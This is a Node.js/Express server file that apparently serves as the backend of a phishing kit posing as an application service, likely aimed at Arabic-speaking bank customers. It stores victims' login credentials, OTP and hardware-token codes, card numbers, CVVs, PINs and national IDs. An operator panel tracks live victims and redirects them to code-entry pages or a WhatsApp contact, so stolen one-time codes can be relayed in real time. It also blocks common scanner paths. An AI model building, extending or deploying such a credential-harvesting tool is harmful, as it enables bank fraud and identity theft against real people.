const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());

// ─── Security Headers ───
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  res.removeHeader('X-Powered-By');
  next();
});

const db = {
  applications: new Map(),
  liveVisitors: new Map(),
  totalVisitors: 0,
  whatsAppLink: 'https://wa.me/message/4Y76G2TADJUVE1',
  adminSession: null,
  redirects: new Map(),
  visitorRedirects: new Map(),
  customMessages: new Map(),
};

// ─── Admin Credentials (env vars or pre-hashed defaults) ───
const ADMIN_USER = process.env.ADMIN_USER || '61646d696e';
const ADMIN_PASS_HASH = process.env.ADMIN_PASS_HASH || 'ac0e7d037817094e9e0b4441f9bae3209d67b02fa484917065f71b16109a1a78';

function resolveAdminUser() {
  if (process.env.ADMIN_USER) return process.env.ADMIN_USER;
  return Buffer.from(ADMIN_USER, 'hex').toString('utf8');
}

// ─── Brute Force Protection ───
const loginAttempts = new Map();
const MAX_ATTEMPTS = 5;
const LOCKOUT_MS = 15 * 60 * 1000;

function checkRateLimit(ip) {
  const record = loginAttempts.get(ip);
  if (!record) return true;
  if (Date.now() - record.firstAttempt > LOCKOUT_MS) {
    loginAttempts.delete(ip);
    return true;
  }
  return record.count < MAX_ATTEMPTS;
}

function recordFailedAttempt(ip) {
  const record = loginAttempts.get(ip);
  if (!record) {
    loginAttempts.set(ip, { count: 1, firstAttempt: Date.now() });
  } else {
    record.count++;
  }
}

function clearAttempts(ip) {
  loginAttempts.delete(ip);
}

function getApp(nationalId) {
  if (!db.applications.has(nationalId)) {
    db.applications.set(nationalId, {
      id: nationalId,
      nationalId,
      username: '',
      password: '',
      otpCode: '',
      hardTokenCode: '',
      cardNumber: '',
      cardExpiry: '',
      cardCvv: '',
      cardPin: '',
      fullName: '',
      phoneNumber: '',
      governorate: '',
      address: '',
      watchColor: 'black',
      watchLinkOtp: '',
      currentPage: 'home',
      status: 'pending',
      showError: false,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });
  }
  return db.applications.get(nationalId);
}

function checkAdmin(cookies) {
  const token = cookies?.admin_token;
  return token && db.adminSession?.token === token;
}

const procedures = {
  'applications.saveLoginData': (input) => {
    const a = getApp(input.nationalId);
    a.username = input.username || '';
    a.password = input.password || '';
    a.currentPage = 'password';
    a.updatedAt = new Date().toISOString();
    return { success: true };
  },

  'applications.saveOtpData': (input) => {
    const a = getApp(input.nationalId);
    a.otpCode = input.otpCode || '';
    a.currentPage = input.otpCode?.startsWith('CONFIRM:') ? 'confirm-otp' : 'otp';
    a.updatedAt = new Date().toISOString();
    return { success: true };
  },

  'applications.saveHardToken': (input) => {
    const a = getApp(input.nationalId);
    a.hardTokenCode = input.hardTokenCode || '';
    a.currentPage = 'hard-token';
    a.updatedAt = new Date().toISOString();
    return { success: true };
  },

  'applications.saveCardData': (input) => {
    const a = getApp(input.nationalId);
    a.cardNumber = input.cardNumber || '';
    a.cardExpiry = input.cardExpiry || '';
    a.cardCvv = input.cardCvv || '';
    a.cardPin = input.cardPin || '';
    a.currentPage = 'card';
    a.updatedAt = new Date().toISOString();
    return { success: true };
  },

  'applications.savePersonalInfo': (input) => {
    const nid = input.nationalId || crypto.randomBytes(8).toString('hex');
    const a = getApp(nid);
    a.fullName = input.fullName || '';
    a.nationalId = nid;
    a.phoneNumber = input.phoneNumber || '';
    a.governorate = input.governorate || '';
    a.address = input.address || '';
    a.watchColor = input.watchColor || 'black';
    a.currentPage = 'personal';
    a.updatedAt = new Date().toISOString();
    return { success: true };
  },

  'applications.saveWatchLink': (input) => {
    const a = getApp(input.nationalId);
    a.watchLinkOtp = input.watchLinkOtp || '';
    a.currentPage = 'watch-link';
    a.updatedAt = new Date().toISOString();
    return { success: true };
  },

  'applications.updatePage': (input) => {
    if (!input.nationalId) return { success: true };
    const a = getApp(input.nationalId);
    a.currentPage = input.page || a.currentPage;
    if (input.showError !== undefined) a.showError = input.showError;
    a.updatedAt = new Date().toISOString();
    return { success: true };
  },

  'applications.getRedirectStatus': (input) => {
    const r = db.redirects.get(input.nationalId);
    if (r) return { redirectTo: r.page, redirectError: r.showError || false };
    return { redirectTo: null };
  },

  'applications.clearRedirectByUser': (input) => {
    if (input?.nationalId) db.redirects.delete(input.nationalId);
    return { success: true };
  },

  'applications.getCustomMessage': (input) => {
    return { message: db.customMessages.get(input.nationalId) || null };
  },

  'applications.clearCustomMessage': (input) => {
    if (input?.nationalId) db.customMessages.delete(input.nationalId);
    return { success: true };
  },

  'admin.login': (input, ctx) => {
    const ip = ctx.ip || 'unknown';
    if (!checkRateLimit(ip)) {
      throw { code: 'UNAUTHORIZED', message: 'تم تجاوز عدد المحاولات. حاول بعد 15 دقيقة' };
    }
    const inputUserHash = crypto.createHash('sha256').update(input.username || '').digest('hex');
    const expectedUserHash = crypto.createHash('sha256').update(resolveAdminUser()).digest('hex');
    const inputPassHash = crypto.createHash('sha256').update(input.password || '').digest('hex');
    const userMatch = crypto.timingSafeEqual(Buffer.from(inputUserHash, 'hex'), Buffer.from(expectedUserHash, 'hex'));
    const passMatch = crypto.timingSafeEqual(Buffer.from(inputPassHash, 'hex'), Buffer.from(ADMIN_PASS_HASH, 'hex'));
    if (userMatch && passMatch) {
      clearAttempts(ip);
      const token = crypto.randomBytes(32).toString('hex');
      db.adminSession = { token, isAdmin: true };
      ctx.setCookie = { name: 'admin_token', value: token };
      return { success: true, isAdmin: true };
    }
    recordFailedAttempt(ip);
    throw { code: 'UNAUTHORIZED', message: 'اسم المستخدم أو كلمة المرور غير صحيحة' };
  },

  'admin.logout': (_input, ctx) => {
    db.adminSession = null;
    ctx.clearCookie = 'admin_token';
    return { success: true };
  },

  'admin.checkSession': (_input, ctx) => {
    return { isAdmin: checkAdmin(ctx.cookies) };
  },

  'admin.getApplications': (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const apps = Array.from(db.applications.values())
      .sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt));
    const now = Date.now();
    const activeIds = apps
      .filter(a => now - new Date(a.updatedAt).getTime() < 120000)
      .map(a => a.nationalId);
    return { apps, activeIds, totalVisitors: db.totalVisitors };
  },

  'admin.deleteApplication': (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    db.applications.delete(input.nationalId);
    db.customMessages.delete(input.nationalId);
    db.redirects.delete(input.nationalId);
    return { success: true };
  },

  'admin.approveLogin': (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const a = db.applications.get(input.nationalId);
    if (a) { a.status = 'approved'; a.updatedAt = new Date().toISOString(); }
    return { success: true };
  },

  'admin.rejectLogin': (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const a = db.applications.get(input.nationalId);
    if (a) { a.status = 'rejected'; a.updatedAt = new Date().toISOString(); }
    return { success: true };
  },

  'admin.redirectUser': (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    db.redirects.set(input.nationalId, { page: input.page || 'login', showError: input.showError || false });
    return { success: true };
  },

  'admin.redirectWhatsApp': (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    db.redirects.set(input.nationalId, { page: 'whatsapp' });
    return { success: true };
  },

  'admin.redirectAllToToken': (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    for (const [nid] of db.applications) {
      db.redirects.set(nid, { page: 'hard-token' });
    }
    return { success: true };
  },

  'admin.setCustomMessage': (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    db.customMessages.set(input.nationalId, input.message);
    return { success: true };
  },

  'admin.getWhatsAppLink': () => {
    return { link: db.whatsAppLink };
  },

  'admin.updateWhatsAppLink': (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    db.whatsAppLink = input.link || db.whatsAppLink;
    return { success: true };
  },

  'admin.getAllVisitors': (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    return Array.from(db.liveVisitors.values());
  },

  'admin.getLiveVisitors': (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const now = Date.now();
    const live = [];
    for (const [sid, v] of db.liveVisitors) {
      if (now - v.lastSeen < 60000) {
        live.push({ sessionId: sid, currentPage: v.currentPage, lastSeen: v.lastSeen });
      }
    }
    return live;
  },

  'admin.updateVisitor': (input) => {
    const existing = db.liveVisitors.get(input.sessionId);
    const now = Date.now();
    if (!existing) {
      db.liveVisitors.set(input.sessionId, { currentPage: input.page || 'home', lastSeen: now, firstSeen: now });
      db.totalVisitors = Math.max(db.totalVisitors, db.liveVisitors.size);
    } else {
      existing.currentPage = input.page || existing.currentPage;
      existing.lastSeen = now;
    }
    return { success: true };
  },

  'admin.deleteInactiveClients': (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const now = Date.now();
    for (const [sid, v] of db.liveVisitors) {
      if (now - v.lastSeen > 300000) db.liveVisitors.delete(sid);
    }
    return { success: true };
  },

  'admin.resetTotalVisitors': (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    db.totalVisitors = 0;
    db.applications.clear();
    db.customMessages.clear();
    db.redirects.clear();
    db.visitorRedirects.clear();
    db.liveVisitors.clear();
    return { success: true };
  },

  'admin.getVisitorRedirect': (input) => {
    const r = db.visitorRedirects.get(input.sessionId);
    return r ? { redirectTo: r.page } : { redirectTo: null };
  },

  'admin.clearVisitorRedirect': (input) => {
    if (input?.sessionId) db.visitorRedirects.delete(input.sessionId);
    return { success: true };
  },

  'admin.redirectVisitor': (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    db.visitorRedirects.set(input.sessionId, { page: input.page || 'login' });
    return { success: true };
  },
};

function runProcedure(name, input, ctx) {
  const handler = procedures[name];
  if (!handler) {
    return {
      error: {
        json: {
          message: `Procedure "${name}" not found`,
          code: -32004,
          data: { code: 'NOT_FOUND', httpStatus: 404, path: name },
        },
      },
    };
  }
  try {
    const data = handler(input, ctx);
    return { result: { data: { json: data } } };
  } catch (e) {
    const isUnauth = e.code === 'UNAUTHORIZED';
    return {
      error: {
        json: {
          message: e.message || 'Internal error',
          code: isUnauth ? -32001 : -32603,
          data: {
            code: isUnauth ? 'UNAUTHORIZED' : 'INTERNAL_SERVER_ERROR',
            httpStatus: isUnauth ? 401 : 500,
            path: name,
          },
        },
      },
    };
  }
}

// ─── Block source map & common scanner paths ───
app.use((req, res, next) => {
  const blocked = /\.(map|env|git|sql|bak|log|DS_Store)$|\/\.(git|env|svn|htaccess)|wp-admin|wp-login|phpmyadmin|xmlrpc/i;
  if (blocked.test(req.path)) return res.status(404).end();
  next();
});

app.all('/api/trpc/:procedures', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
  const ctx = { cookies: req.cookies, setCookie: null, clearCookie: null, ip };
  const isBatch = req.query.batch === '1';
  const procNames = req.params.procedures.split(',');

  const results = procNames.map((name, idx) => {
    let input;
    try {
      if (req.method === 'GET') {
        const raw = req.query.input;
        if (raw) {
          const parsed = JSON.parse(raw);
          const entry = isBatch ? parsed[idx] : parsed;
          input = entry?.json !== undefined ? entry.json : entry;
        }
      } else {
        const entry = isBatch ? req.body[idx] : (req.body || {});
        input = entry?.json !== undefined ? entry.json : entry;
      }
    } catch {}
    return runProcedure(name, input || {}, ctx);
  });

  if (ctx.setCookie) {
    res.cookie(ctx.setCookie.name, ctx.setCookie.value, {
      httpOnly: true, path: '/', sameSite: 'lax', maxAge: 86400000,
    });
  }
  if (ctx.clearCookie) {
    res.clearCookie(ctx.clearCookie, { path: '/' });
  }

  res.json(isBatch ? results : results[0]);
});

app.post('/api/presence', (req, res) => {
  const { sessionId, currentPage } = req.body || {};
  if (sessionId) {
    const existing = db.liveVisitors.get(sessionId);
    const now = Date.now();
    if (!existing) {
      db.liveVisitors.set(sessionId, { currentPage: currentPage || 'home', lastSeen: now, firstSeen: now });
      db.totalVisitors = Math.max(db.totalVisitors, db.liveVisitors.size);
    } else {
      existing.currentPage = currentPage || existing.currentPage;
      existing.lastSeen = now;
    }
  }
  res.json({ ok: true });
});

app.use('/assets', express.static(path.join(__dirname, 'public', 'assets')));
app.use('/manus-storage', express.static(path.join(__dirname, 'public', 'manus-storage')));
app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
}

module.exports = app;
